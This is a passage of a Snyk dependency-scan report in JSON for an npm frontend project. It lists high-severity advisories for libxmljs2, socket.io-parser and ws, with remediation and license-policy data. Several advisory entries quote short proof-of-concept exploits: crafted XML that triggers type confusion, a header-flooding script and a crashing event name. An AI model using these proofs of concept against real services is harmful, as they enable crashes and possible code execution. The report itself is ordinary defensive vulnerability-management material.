        "disclosureTime": "2024-05-02T21:30:29Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-05-05T10:25:25.625355Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-02T08:09:07.427550Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "frontend@19.0.0",
          "@cyclonedx/webpack-plugin@5.1.1",
          "libxmljs2@0.37.0"
        ],
        "upgradePath": [
          false,
          "@cyclonedx/webpack-plugin@5.1.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "libxmljs2",
        "version": "0.37.0"
      },
      {
        "id": "SNYK-JS-LIBXMLJS2-6808816",
        "title": "Type Confusion",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "libxmljs2",
        "references": [
          {
            "url": "https://github.com/marudor/libxmljs2/issues/205",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-02T08:10:05.171208Z"
          }
        ],
        "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion when parsing a specially crafted XML while invoking the namespaces() function (which invokes `XmlNode::get_local_namespaces()`) on a grand-child of a node that refers to an entity. \r\n\r\nExploiting this vulnerability leads to an RCE, data leak DoS on 64-bit and 32-bit systems.\n## PoC\n```js\r\n\r\nconst libxmljs2 = require('libxmljs2');\r\n\r\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE note\r\n[\r\n<!ENTITY writer PUBLIC \"` + \"A\".repeat(8) + \"B\".repeat(8) + \"C\".repeat(8) + \"D\".repeat(8) + \"P\".repeat(8) + `\" \"JFrog Security\">\r\n]>\r\n<from>&writer;</from>\r\n`;\r\n\r\nt = libxmljs2.parseXml(d)\r\nfrom = t.get('//from')\r\nc = from.childNodes()[0]\r\nc2 = c.childNodes()[0] //entity_decl\r\nn = c2.namespaces(true) //onlyLocal = true\r\n\r\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/205)\n",
        "epssDetails": {
          "percentile": "0.86712",
          "probability": "0.03260",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-34394"
          ],
          "CWE": [
            "CWE-843"
          ],
          "GHSA": [
            "GHSA-78h3-pg4x-j8cv"
          ]
        },
        "packageName": "libxmljs2",
        "proprietary": false,
        "creationTime": "2024-05-05T10:34:09.176601Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-05-02T21:30:29Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-05-05T10:34:09.367934Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-02T08:10:05.171208Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "frontend@19.0.0",
          "@cyclonedx/webpack-plugin@5.1.1",
          "libxmljs2@0.37.0"
        ],
        "upgradePath": [
          false,
          "@cyclonedx/webpack-plugin@5.1.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "libxmljs2",
        "version": "0.37.0"
      },
      {
        "id": "SNYK-JS-SOCKETIOPARSER-5596892",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "rafax00"
        ],
        "semver": {
          "vulnerable": [
            ">=3.4.0 <3.4.3",
            ">=4.0.0 <4.2.3"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "3.4.3",
          "4.2.3"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "socket.io-parser",
        "references": [
          {
            "url": "https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/socketio/socket.io-parser/releases/tag/3.4.3",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:18.116269Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:04:09.831372Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:18.116269Z"
          }
        ],
        "description": "## Overview\n[socket.io-parser](https://www.npmjs.org/package/socket.io-parser) is a socket.io protocol parser\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to insufficient validation when decoding a packet. An attacker can send an event with a name like `'2[{\"toString\":\"foo\"}]'` to trigger an uncaught exception and a crash, like the below.\r\n\r\n```\r\nTypeError: Cannot convert object to primitive value\r\n       at Socket.emit (node:events:507:25)\r\n       at .../node_modules/socket.io/lib/socket.js:531:14\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `socket.io-parser` to version 3.4.3, 4.2.3 or higher.\n## References\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced)\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3)\n- [GitHub Release](https://github.com/socketio/socket.io-parser/releases/tag/3.4.3)\n",
        "epssDetails": {
          "percentile": "0.37918",
          "probability": "0.00162",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-32695"
          ],
          "CWE": [
            "CWE-400"
          ],
          "GHSA": [
            "GHSA-cqmj-92xf-r6r9"
          ]
        },
        "packageName": "socket.io-parser",
        "proprietary": false,
        "creationTime": "2023-05-24T07:36:34.088298Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-05-23T19:55:13Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-05-24T07:39:19.358296Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:18.116269Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "frontend@19.0.0",
          "socket.io-client@3.1.3",
          "socket.io-parser@4.0.5"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "socket.io-parser",
        "version": "4.0.5"
      },
      {
        "id": "SNYK-JS-WS-7266574",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Ryan LaPointe"
        ],
        "semver": {
          "vulnerable": [
            ">=2.1.0 <5.2.4",
            ">=6.0.0 <6.2.3",
            ">=7.0.0 <7.5.10",
            ">=8.0.0 <8.17.1"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "5.2.4",
          "6.2.3",
          "7.5.10",
          "8.17.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ws",
        "references": [
          {
            "url": "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/issues/2230",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/websockets/ws/pull/2231",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/websockets/ws/releases/tag/8.17.1",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 5.9,
            "modificationTime": "2024-08-21T13:36:47.485619Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-11-14T13:19:29.299224Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.9,
            "cvssVersion": "3.1",
            "modificationTime": "2024-08-21T13:36:47.485619Z"
          }
        ],
        "description": "## Overview\n[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.\r\n\r\n## Workaround\r\n\r\nThis issue can be mitigating by following these steps:\r\n\r\n1. Reduce the maximum allowed length of the request headers using the `--max-http-header-size=size` and/or the `maxHeaderSize` options so\r\nthat no more headers than the `server.maxHeadersCount` limit can be sent.\r\n\r\n2. Set `server.maxHeadersCount` to 0 so that no limit is applied.\n## PoC\n```js\r\n\r\nconst http = require('http');\r\nconst WebSocket = require('ws');\r\n\r\nconst server = http.createServer();\r\n\r\nconst wss = new WebSocket.Server({ server });\r\n\r\nserver.listen(function () {\r\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\r\n  const headers = {};\r\n  let count = 0;\r\n\r\n  for (let i = 0; i < chars.length; i++) {\r\n    if (count === 2000) break;\r\n\r\n    for (let j = 0; j < chars.length; j++) {\r\n      const key = chars[i] + chars[j];\r\n      headers[key] = 'x';\r\n\r\n      if (++count === 2000) break;\r\n    }\r\n  }\r\n\r\n  headers.Connection = 'Upgrade';\r\n  headers.Upgrade = 'websocket';\r\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\r\n  headers['Sec-WebSocket-Version'] = '13';\r\n\r\n  const request = http.request({\r\n    headers: headers,\r\n    host: '127.0.0.1',\r\n    port: server.address().port\r\n  });\r\n\r\n  request.end();\r\n});\r\n\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.\n## References\n- [GitHub Commit](https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f)\n- [GitHub Commit](https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n- [GitHub Commit](https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)\n- [GitHub Commit](https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63)\n- [GitHub Issue](https://github.com/websockets/ws/issues/2230)\n- [GitHub PR](https://github.com/websockets/ws/pull/2231)\n- [GitHub Release](https://github.com/websockets/ws/releases/tag/8.17.1)\n",
        "epssDetails": {
          "percentile": "0.66724",
          "probability": "0.00541",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-37890"
          ],
          "CWE": [
            "CWE-400"
          ]
        },
        "packageName": "ws",
        "proprietary": false,
        "creationTime": "2024-06-17T14:34:03.689299Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-06-16T13:35:43Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-06-17T14:34:03.928602Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-11-14T13:19:29.299224Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "frontend@19.0.0",
          "socket.io-client@3.1.3",
          "engine.io-client@4.1.4",
          "ws@7.4.6"
        ],
        "upgradePath": [
          false,
          "socket.io-client@4.7.0",
          "engine.io-client@6.5.4",
          "ws@8.17.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "ws",
        "version": "7.4.6"
      }
    ],
    "ok": false,
    "dependencyCount": 1057,
    "org": "samoylenko-sd4",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "npm",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "47 vulnerable dependency paths",
    "remediation": {
      "unresolved": [
        {
          "id": "SNYK-JS-LIBXMLJS2-6808810",
          "title": "Type Confusion",
          "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
          "credit": [
            "Uriya Yavnieli"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 8.1,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "libxmljs2",
          "references": [
            {
              "url": "https://github.com/marudor/libxmljs2/issues/204",
              "title": "GitHub Issue"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 8.1,
              "cvssVersion": "3.1",
              "modificationTime": "2025-06-02T08:09:07.427550Z"
            }
          ],
          "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion due to the improper handling of a specially crafted XML file. An attacker can cause a denial of service, data leak, infinite loop, or execute arbitrary code by invoking a function on the result of `attrs()` that was called on a parsed node.\n## PoC\n```js\n\nconst libxmljs2 = require('libxmljs2');\n\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note\n[\n<!ENTITY writer `\" + 'A'.repeat(0x1234) + `\">\n]>\n<from>&writer;</from>\n`;\n\nt = libxmljs2.parseXml(d, {flags: [libxmljs2.XMLParseFlags.XML_PARSE_HUGE]})\nfrom = t.get('//from')\nc = from.childNodes()[0]\nc2 = c.childNodes()[0]\nc2_attrs = c2.attrs()\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/204)\n",
          "epssDetails": {
            "percentile": "0.86712",
            "probability": "0.03260",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-34393"
            ],
            "CWE": [
              "CWE-843"
            ],
            "GHSA": [
              "GHSA-mjr4-7xg5-pfvh"
            ]
          },
          "packageName": "libxmljs2",
          "proprietary": false,
          "creationTime": "2024-05-05T10:25:25.434709Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-05-02T21:30:29Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-05-05T10:25:25.625355Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-06-02T08:09:07.427550Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "frontend@19.0.0",
            "@cyclonedx/webpack-plugin@5.1.1",
            "libxmljs2@0.37.0"
          ],
          "upgradePath": [
            false,
            "@cyclonedx/webpack-plugin@5.1.1"
          ],
          "isUpgradable": true,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "libxmljs2",
          "version": "0.37.0",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-LIBXMLJS2-6808816",
          "title": "Type Confusion",
          "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
          "credit": [
            "Unknown"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 8.1,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "libxmljs2",
          "references": [
            {
              "url": "https://github.com/marudor/libxmljs2/issues/205",
              "title": "GitHub Issue"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 8.1,
              "cvssVersion": "3.1",
              "modificationTime": "2025-06-02T08:10:05.171208Z"
            }
          ],
          "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion when parsing a specially crafted XML while invoking the namespaces() function (which invokes `XmlNode::get_local_namespaces()`) on a grand-child of a node that refers to an entity. \r\n\r\nExploiting this vulnerability leads to an RCE, data leak DoS on 64-bit and 32-bit systems.\n## PoC\n```js\r\n\r\nconst libxmljs2 = require('libxmljs2');\r\n\r\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE note\r\n[\r\n<!ENTITY writer PUBLIC \"` + \"A\".repeat(8) + \"B\".repeat(8) + \"C\".repeat(8) + \"D\".repeat(8) + \"P\".repeat(8) + `\" \"JFrog Security\">\r\n]>\r\n<from>&writer;</from>\r\n`;\r\n\r\nt = libxmljs2.parseXml(d)\r\nfrom = t.get('//from')\r\nc = from.childNodes()[0]\r\nc2 = c.childNodes()[0] //entity_decl\r\nn = c2.namespaces(true) //onlyLocal = true\r\n\r\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/205)\n",
          "epssDetails": {
            "percentile": "0.86712",
            "probability": "0.03260",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-34394"
            ],
            "CWE": [
              "CWE-843"
            ],
            "GHSA": [
              "GHSA-78h3-pg4x-j8cv"
            ]
          },
          "packageName": "libxmljs2",
          "proprietary": false,
          "creationTime": "2024-05-05T10:34:09.176601Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-05-02T21:30:29Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-05-05T10:34:09.367934Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-06-02T08:10:05.171208Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "frontend@19.0.0",
            "@cyclonedx/webpack-plugin@5.1.1",
            "libxmljs2@0.37.0"
          ],
          "upgradePath": [
            false,
            "@cyclonedx/webpack-plugin@5.1.1"
          ],
          "isUpgradable": true,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "libxmljs2",
          "version": "0.37.0",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-SOCKETIOPARSER-5596892",
          "title": "Denial of Service (DoS)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "credit": [
            "rafax00"
          ],
          "semver": {
            "vulnerable": [
              ">=3.4.0 <3.4.3",
              ">=4.0.0 <4.2.3"
            ]
          },
          "exploit": "Not Defined",
          "fixedIn": [
            "3.4.3",
            "4.2.3"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 7.5,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "socket.io-parser",
          "references": [
            {
              "url": "https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/socketio/socket.io-parser/releases/tag/3.4.3",
              "title": "GitHub Release"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "high",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "cvssV3BaseScore": 7.5,
              "modificationTime": "2024-03-11T09:53:18.116269Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 7.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T14:04:09.831372Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "assigner": "NVD",
              "severity": "high",
              "baseScore": 7.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:18.116269Z"
            }
          ],
          "description": "## Overview\n[socket.io-parser](https://www.npmjs.org/package/socket.io-parser) is a socket.io protocol parser\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to insufficient validation when decoding a packet. An attacker can send an event with a name like `'2[{\"toString\":\"foo\"}]'` to trigger an uncaught exception and a crash, like the below.\r\n\r\n```\r\nTypeError: Cannot convert object to primitive value\r\n       at Socket.emit (node:events:507:25)\r\n       at .../node_modules/socket.io/lib/socket.js:531:14\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `socket.io-parser` to version 3.4.3, 4.2.3 or higher.\n## References\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced)\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3)\n- [GitHub Release](https://github.com/socketio/socket.io-parser/releases/tag/3.4.3)\n",
          "epssDetails": {
            "percentile": "0.37918",
            "probability": "0.00162",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2023-32695"
            ],
            "CWE": [
              "CWE-400"
            ],
            "GHSA": [
              "GHSA-cqmj-92xf-r6r9"
            ]
          },
          "packageName": "socket.io-parser",
          "proprietary": false,
          "creationTime": "2023-05-24T07:36:34.088298Z",
          "functions_new": [],
          "alternativeIds": [],
